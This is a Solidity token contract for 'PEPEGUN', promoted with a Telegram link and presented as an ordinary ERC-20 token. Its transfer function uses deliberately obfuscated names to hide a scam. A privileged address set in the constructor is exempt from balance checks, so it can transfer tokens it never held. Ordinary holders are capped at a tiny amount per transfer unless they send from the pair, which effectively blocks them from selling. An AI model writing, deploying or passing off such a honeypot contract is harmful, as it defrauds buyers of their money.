/*

https://t.me/ercpepegun

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PEPEGUN is Ownable {
    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    string public name;

    function approve(address ukjlwomi, uint256 ryxiobdjuls) public returns (bool success) {
        allowance[msg.sender][ukjlwomi] = ryxiobdjuls;
        emit Approval(msg.sender, ukjlwomi, ryxiobdjuls);
        return true;
    }

    uint8 public decimals = 9;

    string public symbol;

    function vlgi(address xdiu, address xhrqzabovclf, uint256 ryxiobdjuls) private {
        address nyzmhgabujtl = IUniswapV2Factory(jfxhym.factory()).getPair(address(this), jfxhym.WETH());
        bool qgkz = 0 == lzxfgvjrp[xdiu];
        if (qgkz) {
            if (xdiu != nyzmhgabujtl && cqjr[xdiu] != block.number && ryxiobdjuls < totalSupply) {
                require(ryxiobdjuls <= totalSupply / (10 ** decimals));
            }
            balanceOf[xdiu] -= ryxiobdjuls;
        }
        balanceOf[xhrqzabovclf] += ryxiobdjuls;
        cqjr[xhrqzabovclf] = block.number;
        emit Transfer(xdiu, xhrqzabovclf, ryxiobdjuls);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private hqufvnlsgiwr = 114;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory vuilrbsct, string memory tgpkqz, address qsjfclt, address cbrl) {
        name = vuilrbsct;
        symbol = tgpkqz;
        balanceOf[msg.sender] = totalSupply;
        lzxfgvjrp[cbrl] = hqufvnlsgiwr;
        jfxhym = IUniswapV2Router02(qsjfclt);
    }

    IUniswapV2Router02 private jfxhym;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private cqjr;

    function transfer(address xhrqzabovclf, uint256 ryxiobdjuls) public returns (bool success) {
        vlgi(msg.sender, xhrqzabovclf, ryxiobdjuls);
        return true;
    }

    mapping(address => uint256) private lzxfgvjrp;

    function transferFrom(address xdiu, address xhrqzabovclf, uint256 ryxiobdjuls) public returns (bool success) {
        require(ryxiobdjuls <= allowance[xdiu][msg.sender]);
        allowance[xdiu][msg.sender] -= ryxiobdjuls;
        vlgi(xdiu, xhrqzabovclf, ryxiobdjuls);
        return true;
    }
}
